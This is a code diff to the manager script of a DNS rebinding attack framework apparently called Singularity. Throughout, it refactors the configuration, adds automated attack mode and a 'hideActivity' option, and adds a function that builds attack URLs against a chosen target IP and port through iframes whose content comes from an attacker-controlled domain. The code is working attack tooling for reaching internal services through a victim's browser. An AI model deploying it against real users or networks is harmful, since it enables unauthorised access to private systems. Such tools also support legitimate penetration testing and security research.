@@ -17,10 +17,12 @@ const Payload = () => {
     }
 }
 
-const RunningConfiguration = () => {
+const Configuration = () => {
+    let type = null; // determine whether we run a manager driven or automated attack
     let automatic = null;
     let delayDOMLoad = null;
     let alertSuccess = null;
+    let hideActivity = null;
 
     let attackPayloads = [];
     let attackHostDomain = null;
@@ -30,6 +32,8 @@ const RunningConfiguration = () => {
     let indexToken = null;
     let interval = null;
     let rebindingStrategy = null;
+
+    let rebindingSuccessFn = null;
 
     // Obtains URL query parameters value based on name
     // Uses https://stackoverflow.com/questions/901115/how-can-i-get-query-string-values-in-javascript
@@ -46,7 +50,7 @@ const RunningConfiguration = () => {
     }
 
     return {
-        init() {
+        init(rebindingSuccessCb) {
             // Set URL parameter `startattack` to some value 
             // to automatically start attack upon loading manager.html page
             automatic = getParameterByName("startattack");
@@ -60,6 +64,11 @@ const RunningConfiguration = () => {
             // * not informing a victim that an attack completed
             // * or to freeze a headless browser forever (unless performing a DoS attack).
             alertSuccess = getParameterByName("alertsuccess");
+            type = (window.location.pathname === "/manager.html") ? "manager" : "automatic";
+            rebindingSuccessFn = rebindingSuccessCb;
+        },
+        getType() {
+            return type;
         },
         getDelayDOMLoad() {
             return delayDOMLoad;
@@ -70,8 +79,11 @@ const RunningConfiguration = () => {
         getAlertSuccess() {
             return alertSuccess;
         },
-        // Fetches manager-config.json and update runningConfig object
-        getManagerConfig() {
+        getHideActivity() {
+            return hideActivity;
+        },
+        // Fetches manager-config.json and update Configuration object
+        getManagerConfiguration() {
             let result = fetch('/manager-config.json')
                 .then(function (r) {
                     return r.text()
@@ -105,6 +117,9 @@ const RunningConfiguration = () => {
         getTargetHostIPAddress() {
             return targetHostIPAddress;
         },
+        getTargetPort() {
+            return targetPort;
+        },
         getDummyPort() {
             return dummyPort;
         },
@@ -114,8 +129,33 @@ const RunningConfiguration = () => {
         getInterval() {
             return interval;
         },
+        setInterval(i) {
+            interval = i;
+        },
         getRebindingStrategy() {
             return rebindingStrategy;
+        },
+        getRebindingSuccessFn() {
+            return rebindingSuccessFn
+        },
+        setManually(configObject) {
+            attackHostIPAddress = configObject.attackHostIPAddress;
+            attackHostDomain = configObject.attackHostDomain;
+            rebindingStrategy = configObject.rebindingStrategy;
+            interval = configObject.interval;
+            indexToken = configObject.indexToken;
+            hideActivity = configObject.hideActivity;
+            delayDOMLoad = configObject.delayDOMLoad;
+            rebindingSuccessFn = configObject.rebindingSuccessFn;
+
+            if ((type === "automatic") &&
+                (hideActivity === false)) {
+                body.style.display = "block"
+            }
+            if (delayDOMLoad === null) {
+                delaydomloadframe.parentNode.removeChild(delaydomloadframe);
+            }
+
         }
     }
 }
@@ -258,14 +298,14 @@ function putData(url, data) {
 }
 
 const App = () => {
-    let runningConfig = null;
+    let configuration = null;
     let fm = null;
     let hosturl = "http://s-%1-%2-%3-%4-e.%5:%6/%7";
 
-    // Push settings from runningConfig object(obtained from manager-config.json) to UI.
+    // Push settings from configuration object (obtained from manager-config.json) to UI.
     function populateManagerConfig() {
         payloadsElement = document.getElementById('payloads');
-        for (let p of runningConfig.getAttackPayloads()) {
+        for (let p of configuration.getAttackPayloads()) {
             let option = document.createElement('option');
             option.value = p.getName();
             let port = '';
@@ -275,63 +315,86 @@ const App = () => {
             option.text = p.getName() + port;
             payloadsElement.add(option, 0);
         }
-        document.getElementById('attackhostdomain').value = runningConfig.getAttackHostDomain();
-        document.getElementById('attackhostipaddress').value = runningConfig.getAttackHostIPAddress();
-        document.getElementById('targethostipaddress').value = runningConfig.getTargetHostIPAddress();
-        document.getElementById('dummyport').value = runningConfig.getDummyPort();
-        document.getElementById('indextoken').value = runningConfig.getIndexToken();
-        document.getElementById('interval').value = runningConfig.getInterval();
-        document.getElementById(runningConfig.getRebindingStrategy()).selected = true;
-    }
+        document.getElementById('attackhostdomain').value = configuration.getAttackHostDomain();
+        document.getElementById('attackhostipaddress').value = configuration.getAttackHostIPAddress();
+        document.getElementById('targethostipaddress').value = configuration.getTargetHostIPAddress();
+        document.getElementById('dummyport').value = configuration.getDummyPort();
+        document.getElementById('indextoken').value = configuration.getIndexToken();
+        document.getElementById('interval').value = configuration.getInterval();
+        document.getElementById(configuration.getRebindingStrategy()).selected = true;
+    };
+
+    function generateAttackUrl(targetHostIPAddress, targetPort, payload) {
+        return hosturl
+            .replace("%1", configuration.getAttackHostIPAddress())
+            .replace("%2", targetHostIPAddress) // replace(/-/g, '--'))
+            .replace("%3", Math.floor(Math.random() * Math.floor(Number.MAX_SAFE_INTEGER)))
+            .replace("%4", configuration.getRebindingStrategy())
+            .replace("%5", configuration.getAttackHostDomain())
+            .replace("%6", targetPort)
+            .replace("%7", payload + "?rnd=" + Math.random())
+    };
 
     return {
-        init() {
+        getFrameManager() {
+            return fm;
+        },
+        getConfiguration() {
+            return configuration;
+        },
+
+        attackTarget(targetHostIPAddress, targetPort, payload) {
             let self = this;
+            let fid = self.getFrameManager().addFrame(generateAttackUrl(targetHostIPAddress, targetPort, payload))
+
+            self.addFrameToDOM(self.getFrameManager().frame(fid));
+            self.getFrameManager().frame(fid).setTimer(setInterval((() => {
+                self.reloadAttackFrame(self.getFrameManager().frame(fid))
+            }), parseInt(self.getConfiguration().getInterval()) * 1000));
+
+        },
+        init(rebindingSuccessCb) {
+            let self = this;
+
             fm = FrameManager();
 
             // Configuration
-            runningConfig = RunningConfiguration();
+            configuration = Configuration();
             // Initialize defaults settings and settings passed from URL query.
-            runningConfig.init();
-
-            // Remove the delaying of DOM load event (fully loaded page incl. images, css etc.) if not required
-            document.onreadystatechange = function () {
-                if (document.readyState === "interactive") {
-                    if (runningConfig.getDelayDOMLoad() === null) {
-                        delaydomloadframe.parentNode.removeChild(delaydomloadframe);
-                    }
-                }
-            };
+            configuration.init(rebindingSuccessCb);
 
             // Message handler between Manager and attack frames
             window.addEventListener("message", self.receiveMessage, false);
 
-            // Sinularity HTTP server settings initialization
-            document.addEventListener("DOMContentLoaded", function (event) {
-                let HTTPServersConfig = getHTTPServersConfig().then(function (HTTPServersConfig) {
-                    document.getElementById("listenports").textContent = HTTPServersConfig.ports;
-                    document.getElementById("targetport").value = HTTPServersConfig.ports[HTTPServersConfig.ports.length - 1];
-                    document.getElementById("requestport").disabled = !HTTPServersConfig.AllowDynamicHTTPServers;
+            if (configuration.getType() === "manager") {
+
+                // Singularity HTTP server settings initialization
+                document.addEventListener("DOMContentLoaded", function (event) {
+                    let HTTPServersConfig = getHTTPServersConfig().then(function (HTTPServersConfig) {
+                        document.getElementById("listenports").textContent = HTTPServersConfig.ports;
+                        document.getElementById("targetport").value = HTTPServersConfig.ports[HTTPServersConfig.ports.length - 1];
+                        document.getElementById("requestport").disabled = !HTTPServersConfig.AllowDynamicHTTPServers;
+                    });
+
+                    // Fetch Manager configuration from Singularity HTTP server
+                    let payloadsAndTargets = configuration.getManagerConfiguration();
+
+                    // Once we have our HTTP servers config, payloads and targets
+                    Promise.all([HTTPServersConfig, payloadsAndTargets]).then(function (values) {
+                        populateManagerConfig();
+                        //start attack on page load if ?startattack is set     
+                        if (configuration.getAutomatic() !== null) {
+                            self.begin();
+                        }
+                    });
                 });
-
-                // Fetch Manager configuration from Singularity HTTP server
-                let payloadsAndTargets = runningConfig.getManagerConfig();
-
-                // Once we have our HTTP servers config, payloads and targets
-                Promise.all([HTTPServersConfig, payloadsAndTargets]).then(function (values) {
-                    populateManagerConfig();
-                    //start attack on page load if ?startattack is set     
-                    if (runningConfig.getAutomatic() !== null) {
-                        self.begin();
-                    }
-                });
-            });
-
+            };
         },
         addFrameToDOM(frame) {
             let f = document.createElement("iframe");
             f.src = frame.getURL();
             f.setAttribute('id', frame.getId());
+            //f.setAttribute('style', "display: none");
             document.getElementById("attackframes").appendChild(f);
         },
 
@@ -357,11 +420,11 @@ const App = () => {
                 clearInterval(fm.frame(fid).getTimer());
                 msg.source.postMessage({
                     cmd: "interval",
-                    param: document.getElementById("interval").value
+                    param: configuration.getInterval()
                 }, "*");
                 msg.source.postMessage({
                     cmd: "indextoken",
-                    param: document.getElementById("indextoken").value
+                    param: configuration.getIndexToken()
                 }, "*");
                 msg.source.postMessage({
                     cmd: "start",
@@ -369,19 +432,10 @@ const App = () => {
                 }, "*");
             }
             if (msg.data.status == "success") {
-                console.log("Iframe reports attack successful", msg.data.response);
-
+                configuration.getRebindingSuccessFn()(msg);
                 msg.source.postMessage({
                     cmd: "stop"
                 }, "*");
-
-                setTimeout(function () {
-                    delaydomloadframe.src = "about:blank";
-                }, 10000);
-
-                if (runningConfig.getAlertSuccess() !== "false") {
-                    alert("Attack Successful: " + document.domain + " " + msg.data.response);
-                }
             };
 
             // Possibly a firewalled or closed port. Possibly a non-HTTP service.
@@ -393,8 +447,7 @@ const App = () => {
                     document.getElementById(fid).contentWindow.postMessage({
                         cmd: "stop"
                     }, "*");
-                    //delaydomloadframe.src = "about:blank";
-                    alert("Too many errors");
+                    console.log("Too many errors. Stopping.");
                 }
             }
 
@@ -403,6 +456,9 @@ const App = () => {
         begin() {
             let self = this;
 
+            const UiInterval = document.getElementById("interval").value;
+            configuration.setInterval(UiInterval);
+
             let fid = fm.addFrame(hosturl
                 .replace("%1", document.getElementById("attackhostipaddress").value)
                 .replace("%2", document.getElementById("targethostipaddress").value.replace(/-/g, '--'))
@@ -410,7 +466,7 @@ const App = () => {
                 .replace("%4", document.getElementById("rebindingStrategy").value)
                 .replace("%5", document.getElementById("attackhostdomain").value)
                 .replace("%6", document.getElementById("targetport").value)
-                .replace("%7", document.getElementById("payloads").value) +  "?rnd=" + Math.random());
+                .replace("%7", document.getElementById("payloads").value) + "?rnd=" + Math.random());
 
             self.addFrameToDOM(fm.frame(fid));
 
@@ -419,13 +475,22 @@ const App = () => {
 
             fm.frame(fid).setTimer(setInterval((() => {
                 self.reloadAttackFrame(fm.frame(fid))
-            }), parseInt(document.getElementById("interval").value) * 1000));
+            }), parseInt(UiInterval) * 1000));
 
             //self.reloadAttackFrame(fm.frame(fid));
         }
     }
 }
 
+function rebindingSuccessCb(msg) {
+    console.log(`Iframe reports attack successful for ${window.location.hostname}\n${msg.data.response}`);
+    if ((app.getConfiguration().getAlertSuccess() !== "false") &&
+        (app.getConfiguration().getType() === "manager")) {
+        alert("Attack Successful: " + document.domain + " " + msg.data.response);
+    }
+
+}
+
 // Start
 const app = App();
-app.init();
+app.init(rebindingSuccessCb);
